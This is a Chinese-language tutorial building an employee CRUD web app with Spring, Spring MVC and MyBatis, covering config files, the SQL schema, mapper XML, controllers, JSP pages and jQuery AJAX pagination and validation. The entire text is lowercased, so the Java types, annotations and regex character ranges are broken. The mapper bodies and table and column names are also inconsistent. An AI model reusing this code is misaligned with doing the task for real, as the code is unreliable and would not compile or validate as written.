</tx:advice>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# 配置mybatis配置文件\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype configuration\n        public "-//mybatis.org//dtd config 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-config.dtd">\n<configuration>\n    <settings>\n        <setting name="mapunderscoretocamelcase" value="true"/>\n    </settings>\n\n    <typealiases>\n        <package name="com.pwddd.ssm.bean"/>\n    </typealiases>\n\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 创建数据库表\n\n/*\n navicat premium data transfer\n\n source server         : localhost\n source server type    : mysql\n source server version : 50728\n source host           : localhost:3306\n source schema         : ssm_crud\n\n target server type    : mysql\n target server version : 50728\n file encoding         : 65001\n\n date: 24/02/2022 14:48:02\n*/\n\nset names utf8mb4;\nset foreign_key_checks = 0;\n\n-- ----------------------------\n-- table structure for tbl_dept\n-- ----------------------------\ndrop table if exists `tbl_dept`;\ncreate table `tbl_dept`  (\n  `dept_id` int(11) not null auto_increment,\n  `dept_name` varchar(255) character set utf8 collate utf8_general_ci not null,\n  primary key (`dept_id`) using btree\n) engine = innodb auto_increment = 1 character set = utf8 collate = utf8_general_ci row_format = dynamic;\n\n-- ----------------------------\n-- table structure for tbl_employee\n-- ----------------------------\ndrop table if exists `tbl_employee`;\ncreate table `tbl_employee`  (\n  `emp_id` int(11) not null auto_increment,\n  `emp_name` varchar(255) character set utf8 collate utf8_general_ci not null,\n  `gender` char(1) character set utf8 collate utf8_general_ci null default null,\n  `email` varchar(255) character set utf8 collate utf8_general_ci null default null,\n  `d_id` int(11) not null,\n  primary key (`emp_id`) using btree,\n  index `fk_dept`(`d_id`) using btree,\n  constraint `fk_dept` foreign key (`d_id`) references `tbl_dept` (`dept_id`) on delete restrict on update restrict\n) engine = innodb auto_increment = 1 character set = utf8 collate = utf8_general_ci row_format = dynamic;\n\nset foreign_key_checks = 1;\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# mybatis逆向工程\n\n<?xml version="1.0" encoding="utf-8"?>\n<!doctype generatorconfiguration\n        public "-//mybatis.org//dtd mybatis generator configuration 1.0//en"\n        "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd">\n<generatorconfiguration>\n\n    <context id="mybatismysql" targetruntime="mybatis3">\n        <commentgenerator>\n            <property name="suppressallcomments" value="true" />\n        </commentgenerator>\n        \x3c!-- 配置数据库连接 --\x3e\n        <jdbcconnection driverclass="com.mysql.jdbc.driver"\n                        connectionurl="jdbc:mysql://localhost:3306/ssm_crud?usessl=false"\n                        userid="root"\n                        password="123456">\n        </jdbcconnection>\n\n        <javatyperesolver>\n            <property name="forcebigdecimals" value="false" />\n        </javatyperesolver>\n\n        \x3c!-- 指定javabean生成的位置 --\x3e\n        <javamodelgenerator targetpackage="com.pwddd.ssm.bean"\n                            targetproject=".\\src\\main\\java">\n            <property name="enablesubpackages" value="true" />\n            <property name="trimstrings" value="true" />\n        </javamodelgenerator>\n\n        \x3c!--指定sql映射文件生成的位置 --\x3e\n        <sqlmapgenerator targetpackage="mapper" targetproject=".\\src\\main\\resources">\n            <property name="enablesubpackages" value="true" />\n        </sqlmapgenerator>\n\n        \x3c!-- 指定dao接口生成的位置，mapper接口 --\x3e\n        <javaclientgenerator type="xmlmapper"\n                             targetpackage="com.pwddd.ssm.dao" targetproject=".\\src\\main\\java">\n            <property name="enablesubpackages" value="true" />\n        </javaclientgenerator>\n\n\n        \x3c!-- table指定每个表的生成策略 --\x3e\n        <table tablename="tbl_emp" domainobjectname="employee"></table>\n        <table tablename="tbl_dept" domainobjectname="department"></table>\n    </context>\n</generatorconfiguration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n启动逆向工程\n\npublic static void main(string[] args) throws exception {\n    list<string> warnings = new arraylist<string>();\n    boolean overwrite = true;\n    file configfile = new file("mbg.xml");\n    configurationparser cp = new configurationparser(warnings);\n    configuration config = cp.parseconfiguration(configfile);\n    defaultshellcallback callback = new defaultshellcallback(overwrite);\n    mybatisgenerator mybatisgenerator = new mybatisgenerator(config, callback, warnings);\n    mybatisgenerator.generate(null);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 修改生成的mapper\n\n  <select id="selectbyprimarykeywithdept" resultmap="withdeptresultmap">\n      select\n      <if test="distinct">\n        distinct\n      </if>\n      <include refid="withdept_column_list" />\n      from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n      <if test="_parameter != null">\n        <include refid="example_where_clause" />\n      </if>\n      <if test="orderbyclause != null">\n        order by ${orderbyclause}\n      </if>\n  </select>\n\n  <select id="selectbyexamplewithdept" resultmap="withdeptresultmap">\n    select\n    <include refid="withdept_column_list" />\n    from tbl_employee e left join tbl_dept d on e.d_id = d.dept_id\n    where emp_id = #{empid,jdbctype=integer}\n\n  </select>\n\n  \x3c!--自定义联合查询--\x3e\n  <sql id="withdept_column_list">\n    e.emp_id, e.emp_name, e.gender, e.email, e.dept_id , d.dept_name\n  </sql>\n\n  <resultmap id="withdeptresultmap" type="com.pwddd.ssm.bean.employee">\n    <id column="emp_id" jdbctype="integer" property="empid" />\n    <result column="emp_name" jdbctype="varchar" property="empname" />\n    <result column="gender" jdbctype="char" property="gender" />\n    <result column="email" jdbctype="varchar" property="email" />\n    <association property="department" javatype="com.pwddd.ssm.bean.department">\n      <result column="dept_id" property="deptid" />\n      <result column="dept_name" property="deptname" />\n    </association>\n  </resultmap> \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n\n# spring注入 测试dao层\n\n为了批量插入数据库，需要配置一个批量操作的sqlsession\n\n<bean class="org.mybatis.spring.sqlsessiontemplate" id="sqlsession">\n    <constructor-arg index="0" ref="sqlsessionfactory" />\n    <constructor-arg index="1" value="batch" />\n</bean>\n\n\n1\n2\n3\n4\n\n\n批量插入数据\n\n    @test\n    public void testemp(){\n        employeemapper mapper = sqlsession.getmapper(employeemapper.class);\n\n        for (int i = 0 ; i<=10000;i++){\n            mapper.insertselective(new employee(\n                uuid.randomuuid().tostring().substring(0,5),\n                "m",\n                uuid.randomuuid().tostring().substring(0,5)+"@qq.com",\n                1));\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 数据处理\n\n\n# 查询员工列表\n\n 1. 编写controller，接收请求\n\n@getmapping("/emps")\npublic string getemps(@requestparam(value = "pn",defaultvalue = "1")integer pn,\n                      @requestparam(value = "num",defaultvalue = "5")integer num,\n                      model model){\n    // 设置分页\n    pagehelper.startpage(pn,num);\n    list<employee> employees = employeeservice.getemps();\n    pageinfo pageinfo = new pageinfo(employees,5);\n    model.addattribute("pageinfo",pageinfo);\n    return "list";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 2. 配置分页插件\n\n<plugins>\n    <plugin interceptor="com.github.pagehelper.pageinterceptor" />\n</plugins>\n\n\n1\n2\n3\n\n 3. 测试查询\n\nimport com.github.pagehelper.pageinfo;\nimport com.pwddd.ssm.bean.employee;\nimport org.junit.before;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.mock.web.mockhttpservletrequest;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit4.springjunit4classrunner;\nimport org.springframework.test.context.web.webappconfiguration;\nimport org.springframework.test.web.servlet.mockmvc;\nimport org.springframework.test.web.servlet.mockmvcbuilder;\nimport org.springframework.test.web.servlet.mvcresult;\nimport org.springframework.test.web.servlet.request.mockmvcrequestbuilders;\nimport org.springframework.test.web.servlet.setup.mockmvcbuilders;\nimport org.springframework.web.context.webapplicationcontext;\n\nimport java.util.list;\n\n@webappconfiguration\n@runwith(springjunit4classrunner.class)\n@contextconfiguration(locations = {"classpath:applicationcontext.xml","classpath:spring-mvc.xml"})\npublic class testmvc {\n\n    @autowired\n    private webapplicationcontext applicationcontext;\n\n    private mockmvc mockmvc;\n\n    @before\n    public void init(){\n        mockmvc = mockmvcbuilders.webappcontextsetup(applicationcontext).build();\n    }\n\n    @test\n    public void testselectallemps() throws exception {\n        mvcresult mvcresult = mockmvc.perform(mockmvcrequestbuilders.get("/emps")\n                .param("pn", "1").param("num", "20")).andreturn();\n        mockhttpservletrequest request = mvcresult.getrequest();\n        pageinfo pageinfo = (pageinfo) request.getattribute("pageinfo");\n        system.out.println(pageinfo);\n        list<employee> list = pageinfo.getlist();\n        for (employee employee :\n        list) {\n            system.out.println(employee.getempid());\n        }\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n\n 4. 编写页面,index.jsp设置跳转我们的请求地址。\n\n\n<%@ page language="java" contenttype="text/html; charset=utf-8"\n         pageencoding="utf-8"%>\n<%@taglib uri="http://java.sun.com/jsp/jstl/core" prefix="c"%>\n<!doctype html public "-//w3c//dtd html 4.01 transitional//en" "http://www.w3.org/tr/html4/loose.dtd">\n<html>\n<head>\n    <meta http-equiv="content-type" content="text/html; charset=utf-8">\n    <title>员工列表</title>\n<%\n    pagecontext.setattribute("app_path", request.getcontextpath());\n%>\n    \x3c!-- web路径：\n不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出问题。\n以/开始的相对路径，找资源，以服务器的路径为标准(http://localhost:3306)；需要加上项目名\n\t\thttp://localhost:3306/crud\n --\x3e\n    <script type="text/javascript"\n            src="${app_path}/static/js/jquery-1.12.4.min.js"><\/script>\n    <link\n            href="${app_path}/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"\n            rel="stylesheet">\n    <script\n            src="${app_path}/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"><\/script>\n</head>\n<body>\n\x3c!-- 搭建显示页面 --\x3e\n<div class="container">\n    \x3c!-- 标题 --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <h1>ssm-crud</h1>\n        </div>\n    </div>\n    \x3c!-- 按钮 --\x3e\n    <div class="row">\n        <div class="col-md-4 col-md-offset-8">\n            <button class="btn btn-primary">新增</button>\n            <button class="btn btn-danger">删除</button>\n        </div>\n    </div>\n    \x3c!-- 显示表格数据 --\x3e\n    <div class="row">\n        <div class="col-md-12">\n            <table class="table table-hover">\n                <tr>\n                    <th>#</th>\n                    <th>empname</th>\n                    <th>gender</th>\n                    <th>email</th>\n                    <th>deptname</th>\n                    <th>操作</th>\n                </tr>\n                <c:foreach items="${pageinfo.list }" var="emp">\n                    <tr>\n                        <th>${emp.empid }</th>\n                        <th>${emp.empname }</th>\n                        <th>${emp.gender=="m"?"男":"女" }</th>\n                        <th>${emp.email }</th>\n                        <th>${emp.department.deptname }</th>\n                        <th>\n                            <button class="btn btn-primary btn-sm">\n                                <span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>\n                                编辑\n                            </button>\n                            <button class="btn btn-danger btn-sm">\n                                <span class="glyphicon glyphicon-trash" aria-hidden="true"></span>\n                                删除\n                            </button>\n                        </th>\n                    </tr>\n                </c:foreach>\n            </table>\n        </div>\n    </div>\n\n    \x3c!-- 显示分页信息 --\x3e\n    <div class="row">\n        \x3c!--分页文字信息  --\x3e\n        <div class="col-md-6">当前 ${pageinfo.pagenum }页,总${pageinfo.pages }\n            页,总 ${pageinfo.total } 条记录</div>\n        \x3c!-- 分页条信息 --\x3e\n        <div class="col-md-6">\n            <nav aria-label="page navigation">\n                <ul class="pagination">\n                    <li><a href="${app_path }/emps?pn=1">首页</a></li>\n                    <c:if test="${pageinfo.haspreviouspage }">\n                        <li><a href="${app_path }/emps?pn=${pageinfo.pagenum-1}"\n                               aria-label="previous"> <span aria-hidden="true">&laquo;</span>\n                        </a></li>\n                    </c:if>\n\n\n                    <c:foreach items="${pageinfo.navigatepagenums }" var="page_num">\n                        <c:if test="${page_num == pageinfo.pagenum }">\n                            <li class="active"><a href="#">${page_num }</a></li>\n                        </c:if>\n                        <c:if test="${page_num != pageinfo.pagenum }">\n                            <li><a href="${app_path }/emps?pn=${page_num }">${page_num }</a></li>\n                        </c:if>\n\n                    </c:foreach>\n                    <c:if test="${pageinfo.hasnextpage }">\n                        <li><a href="${app_path }/emps?pn=${pageinfo.pagenum+1 }"\n                               aria-label="next"> <span aria-hidden="true">&raquo;</span>\n                        </a></li>\n                    </c:if>\n                    <li><a href="${app_path }/emps?pn=${pageinfo.pages}">末页</a></li>\n                </ul>\n            </nav>\n        </div>\n    </div>\n\n</div>\n</body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n\n 5. 注意：idea自动生成的web-app版本为2.3，该版本的web-app并不支持el表达式，因此我们编写的jsp页面会出错。需要将web.xml的文档约束修改为如下的内容：\n\n<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://xmlns.jcp.org/xml/ns/javaee\n         http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"\n         version="3.1">\n\n\n1\n2\n3\n4\n5\n\n\n# 使用ajax请求\n\n//1、页面加载完成以后，直接去发送ajax请求,要到分页数据\n$(function(){\n    //去首页\n    to_page(1);\n});\nfunction to_page(pn){\n    $.ajax({\n        url:"${app_path}/emps",\n        data:"pn="+pn,\n        type:"get",\n        success:function(result){\n            //console.log(result);\n            //1、解析并显示员工数据\n            build_emps_table(result);\n            //2、解析并显示分页信息\n            build_page_info(result);\n            //3、解析显示分页条数据\n            build_page_nav(result);\n        }\n    });\n}\n\nfunction build_emps_table(result){\n    //清空table表格\n    $("#emps_table tbody").empty();\n    var emps = result.extend.pageinfo.list;\n    $.each(emps,function(index,item){\n        var checkboxtd = $("<td><input type=\'checkbox\' class=\'check_item\'/></td>");\n        var empidtd = $("<td></td>").append(item.empid);\n        var empnametd = $("<td></td>").append(item.empname);\n        var gendertd = $("<td></td>").append(item.gender==\'m\'?"男":"女");\n        var emailtd = $("<td></td>").append(item.email);\n        var deptnametd = $("<td></td>").append(item.department.deptname);\n        /**\n             <button class="">\n             <span class="" aria-hidden="true"></span>\n             编辑\n             </button>\n             */\n        var editbtn = $("<button></button>").addclass("btn btn-primary btn-sm edit_btn")\n        .append($("<span></span>").addclass("glyphicon glyphicon-pencil")).append("编辑");\n        //为编辑按钮添加一个自定义的属性，来表示当前员工id\n        editbtn.attr("edit-id",item.empid);\n        var delbtn =  $("<button></button>").addclass("btn btn-danger btn-sm delete_btn")\n        .append($("<span></span>").addclass("glyphicon glyphicon-trash")).append("删除");\n        //为删除按钮添加一个自定义的属性来表示当前删除的员工id\n        delbtn.attr("del-id",item.empid);\n        var btntd = $("<td></td>").append(editbtn).append(" ").append(delbtn);\n        //var delbtn =\n        //append方法执行完成以后还是返回原来的元素\n        $("<tr></tr>").append(checkboxtd)\n            .append(empidtd)\n            .append(empnametd)\n            .append(gendertd)\n            .append(emailtd)\n            .append(deptnametd)\n            .append(btntd)\n            .appendto("#emps_table tbody");\n    });\n}\n//解析显示分页信息\nfunction build_page_info(result){\n    $("#page_info_area").empty();\n    $("#page_info_area").append("当前"+result.extend.pageinfo.pagenum+"页,总"+\n                                result.extend.pageinfo.pages+"页,总"+\n                                result.extend.pageinfo.total+"条记录");\n    totalrecord = result.extend.pageinfo.total;\n    currentpage = result.extend.pageinfo.pagenum;\n}\n//解析显示分页条，点击分页要能去下一页....\nfunction build_page_nav(result){\n    //page_nav_area\n    $("#page_nav_area").empty();\n    var ul = $("<ul></ul>").addclass("pagination");\n\n    //构建元素\n    var firstpageli = $("<li></li>").append($("<a></a>").append("首页").attr("href","#"));\n    var prepageli = $("<li></li>").append($("<a></a>").append("&laquo;"));\n    if(result.extend.pageinfo.haspreviouspage == false){\n        firstpageli.addclass("disabled");\n        prepageli.addclass("disabled");\n    }else{\n        //为元素添加点击翻页的事件\n        firstpageli.click(function(){\n            to_page(1);\n        });\n        prepageli.click(function(){\n            to_page(result.extend.pageinfo.pagenum -1);\n        });\n    }\n\n\n\n    var nextpageli = $("<li></li>").append($("<a></a>").append("&raquo;"));\n    var lastpageli = $("<li></li>").append($("<a></a>").append("末页").attr("href","#"));\n    if(result.extend.pageinfo.hasnextpage == false){\n        nextpageli.addclass("disabled");\n        lastpageli.addclass("disabled");\n    }else{\n        nextpageli.click(function(){\n            to_page(result.extend.pageinfo.pagenum +1);\n        });\n        lastpageli.click(function(){\n            to_page(result.extend.pageinfo.pages);\n        });\n    }\n\n\n\n    //添加首页和前一页 的提示\n    ul.append(firstpageli).append(prepageli);\n    //1,2，3遍历给ul中添加页码提示\n    $.each(result.extend.pageinfo.navigatepagenums,function(index,item){\n\n        var numli = $("<li></li>").append($("<a></a>").append(item));\n        if(result.extend.pageinfo.pagenum == item){\n            numli.addclass("active");\n        }\n        numli.click(function(){\n            to_page(item);\n        });\n        ul.append(numli);\n    });\n    //添加下一页和末页 的提示\n    ul.append(nextpageli).append(lastpageli);\n\n    //把ul加入到nav\n    var navele = $("<nav></nav>").append(ul);\n    navele.appendto("#page_nav_area");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n\n\n后台响应json数据，需要引入jackson，并设置@responsebody注解\n\n\n# 添加页面显示部门下拉列表\n\n 1. 添加部门controller\n\n@controller\npublic class deptcontroller {\n\n    @autowired\n    private deptserrvice deptserrvice;\n\n    @responsebody\n    @requestmapping("/depts")\n    public msg getalldepts(){\n        list<department> depts  = deptserrvice.getalldepts();\n        return msg.success().add("depts",depts);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n 2. 当用户点击编辑按钮时，发送ajax请求，获取到部门信息\n\n//查出所有的部门信息并显示在下拉列表中\nfunction getdepts(ele){\n    //清空之前下拉列表的值\n    $(ele).empty();\n    $.ajax({\n        url:"${app_path}/depts",\n        type:"get",\n        success:function(result){\n            //{"code":100,"msg":"处理成功！",\n            //"extend":{"depts":[{"deptid":1,"deptname":"开发部"},{"deptid":2,"deptname":"测试部"}]}}\n            //console.log(result);\n            //显示部门信息在下拉列表中\n            //$("#empaddmodal select").append("")\n            $.each(result.extend.depts,function(){\n                var optionele = $("<option></option>").append(this.deptname).attr("value",this.deptid);\n                optionele.appendto(ele);\n            });\n        }\n    });\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 检测用户名是否可用\n\n 1. 编写对应的请求处理方法\n\n@getmapping("/checkuser")\n@responsebody\npublic msg checkuser(@requestparam("empname")string empname){\n    boolean result = employeeservice.checkusername(empname);\n    if (result){\n        return msg.success();\n    }else {\n        return msg.fail().add("va_msg","用户名不可用！");\n    }\n}\n\npublic boolean checkusername(string empname) {\n    employeeexample employeeexample = new employeeexample();\n    employeeexample.criteria criteria = employeeexample.createcriteria();\n    criteria.andempnameequalto(empname);\n    long empscount = employeemapper.countbyexample(employeeexample);\n    if (empscount == 0){\n        return true;\n    }else{\n        return false;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n 2. 前端发起ajax请求\n\n//校验用户名是否可用\n$("#empname_add_input").change(function(){\n    //发送ajax请求校验用户名是否可用\n    var empname = this.value;\n    $.ajax({\n        url:"${app_path}/checkuser",\n        data:"empname="+empname,\n        type:"get",\n        success:function(result){\n            if(result.code==100){\n                show_validate_msg("#empname_add_input","success","用户名可用");\n                $("#emp_save_btn").attr("ajax-va","success");\n            }else{\n                show_validate_msg("#empname_add_input","error",result.extend.va_msg);\n                $("#emp_save_btn").attr("ajax-va","error");\n            }\n        }\n    });\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 保存用户信息\n\n 1. 编写处理接受保存数据的方法\n    \n    /**\n         * 员工保存\n         * 1、支持jsr303校验\n         * 2、导入hibernate-validator\n         *\n         *\n         * @return\n         */\n    @requestmapping(value="/emp",method=requestmethod.post)\n    @responsebody\n    public msg saveemp(@valid employee employee, bindingresult result){\n        if(result.haserrors()){\n            //校验失败，应该返回失败，在模态框中显示校验失败的错误信息\n            map<string, object> map = new hashmap<>();\n            list<fielderror> errors = result.getfielderrors();\n            for (fielderror fielderror : errors) {\n                system.out.println("错误的字段名："+fielderror.getfield());\n                system.out.println("错误信息："+fielderror.getdefaultmessage());\n                map.put(fielderror.getfield(), fielderror.getdefaultmessage());\n            }\n            return msg.fail().add("errorfields", map);\n        }else{\n            employeeservice.adduser(employee);\n            return msg.success();\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    \n\n 2. 设置后端jsr303校验\n    \n    package com.pwddd.ssm.bean;\n    \n    import javax.validation.constraints.pattern;\n    \n    \n    \n    public class employee {\n        private integer empid;\n    \n        @pattern(regexp="(^[a-za-z0-9_-]{6,16}$)|(^[\\u2e80-\\u9fff]{2,5})"\n                 ,message="用户名必须是2-5位中文或者6-16位英文和数字的组合")\n        private string empname;\n    \n        private string gender;\n    \n        //@email\n        @pattern(regexp="^([a-z0-9_\\\\.-]+)@([\\\\da-z\\\\.-]+)\\\\.([a-z\\\\.]{2,6})$",\n                 message="邮箱格式不正确")\n        private string email;\n    \n        private integer did;\n    \n        //希望查询员工的同时部门信息也是查询好的\n        private department department;\n    \n    \n        public employee(string empname, string gender, string email, integer did) {\n            this.empname = empname;\n            this.gender = gender;\n            this.email = email;\n            this.did = did;\n        }\n    \n        @override\n        public string tostring() {\n            return "employee [empid=" + empid + ", empname=" + empname\n                + ", gender=" + gender + ", email=" + email + ", did=" + did\n                + "]";\n        }\n    \n        public employee() {\n            super();\n        }\n    \n        public employee(integer empid, string empname, string gender, string email,\n                        integer did) {\n            super();\n            this.empid = empid;\n            this.empname = empname;\n            this.gender = gender;\n            this.email = email;\n            this.did = did;\n        }\n    \n        public department getdepartment() {\n            return department;\n        }\n    \n        public void setdepartment(department department) {\n            this.department = department;\n        }\n    \n        public integer getempid() {\n            return empid;\n        }\n    \n        public void setempid(integer empid) {\n            this.empid = empid;\n        }\n    \n        public string getempname() {\n            return empname;\n        }\n    \n        public void setempname(string empname) {\n            this.empname = empname == null ? null : empname.trim();\n        }\n    \n        public string getgender() {\n            return gender;\n        }\n    \n        public void setgender(string gender) {\n            this.gender = gender == null ? null : gender.trim();\n        }\n    \n        public string getemail() {\n            return email;\n        }\n    \n        public void setemail(string email) {\n            this.email = email == null ? null : email.trim();\n        }\n    \n        public integer getdid() {\n            return did;\n        }\n    \n        public void setdid(integer did) {\n            this.did = did;\n        }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    87\n    88\n    89\n    90\n    91\n    92\n    93\n    94\n    95\n    96\n    97\n    98\n    99\n    100\n    101\n    102\n    103\n    \n\n 3. 前端ajax将表单信息发送给服务器\n    \n    //点击保存，保存员工。\n    $("#emp_save_btn").click(function(){\n        //1、模态框中填写的表单数据提交给服务器进行保存\n        //1、先对要提交给服务器的数据进行校验\n        if(!validate_add_form()){\n            return false;\n        };\n        //1、判断之前的ajax用户名校验是否成功。如果成功。\n        if($(this).attr("ajax-va")=="error"){\n            return false;\n        }\n    \n        //2、发送ajax请求保存员工\n        $.ajax({\n            url:"${app_path}/emp",\n            type:"post",\n            data:$("#empaddmodal form").serialize(),\n            success:function(result){\n                //alert(result.msg);\n                if(result.code == 100){\n                    //员工保存成功；\n                    //1、关闭模态框\n                    $("#empaddmodal").modal(\'hide\');\n    \n                    //2、来到最后一页，显示刚才保存的数据\n                    //发送ajax请求显示最后一页数据即可\n                    to_page(totalrecord);\n                }else{\n                    //显示失败信息\n                    //console.log(result);\n                    //有哪个字段的错误信息就显示哪个字段的；\n                    if(undefined != result.extend.errorfields.email){\n                        //显示邮箱错误信息\n                        show_validate_msg("#email_add_input", "error", result.extend.errorfields.email);\n                    }\n                    if(undefined != result.extend.errorfields.empname){\n                        //显示员工名字的错误信息\n                        show_validate_msg("#empname_add_input", "error", result.extend.errorfields.empname);\n                    }\n                }\n            }\n        });\n    });\n    \n    //校验表单数据\n    function validate_add_form(){\n        //1、拿到要校验的数据，使用正则表达式\n        var empname = $("#empname_add_input").val();\n        var regname = /(^[a-za-z0-9_-]{6,16}$)|(^[\\u2e80-\\u9fff]{2,5})/;\n        if(!regname.test(empname)){\n            //alert("用户名可以是2-5位中文或者6-16位英文和数字的组合");\n            show_validate_msg("#empname_add_input", "error", "用户名可以是2-5位中文或者6-16位英文和数字的组合");\n            return false;\n        }else{\n            show_validate_msg("#empname_add_input", "success", "");\n        };\n    \n        //2、校验邮箱信息\n        var email = $("#email_add_input").val();\n        var regemail = /^([a-z0-9_\\.-]+)@([\\da-z\\.-]+)\\.([a-z\\.]{2,6})$/;\n        if(!regemail.test(email)){\n            //alert("邮箱格式不正确");\n            //应该清空这个元素之前的样式\n            show_validate_msg("#email_add_input", "error", "邮箱格式不正确");\n            /* $("#email_add_input").parent().addclass("has-error");\n                $("#email_add_input").next("span").text("邮箱格式不正确"); */\n            return false;\n        }else{\n            show_validate_msg("#email_add_input", "success", "");\n        }\n        return true;\n    }\n    \n    //显示校验结果的提示信息\n    function show_validate_msg(ele,status,msg){\n        //清除当前元素的校验状态\n        $(ele).parent().removeclass("has-success has-error");\n        $(ele).next("span").text("");\n        if("success"==status){\n            $(ele).parent().addclass("has-success");\n            $(ele).next("span").text(msg);\n        }else if("error" == status){\n            $(ele).parent().addclass("has-error");\n            $(ele).next("span").text(msg);\n        }\n    }\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    44\n    45\n    46\n    47\n    48\n    49\n    50\n    51\n    52\n    53\n    54\n    55\n    56\n    57\n    58\n    59\n    60\n    61\n    62\n    63\n    64\n    65\n    66\n    67\n    68\n    69\n    70\n    71\n    72\n    73\n    74\n    75\n    76\n    77\n    78\n    79\n    80\n    81\n    82\n    83\n    84\n    85\n    86\n    \n\n 4. 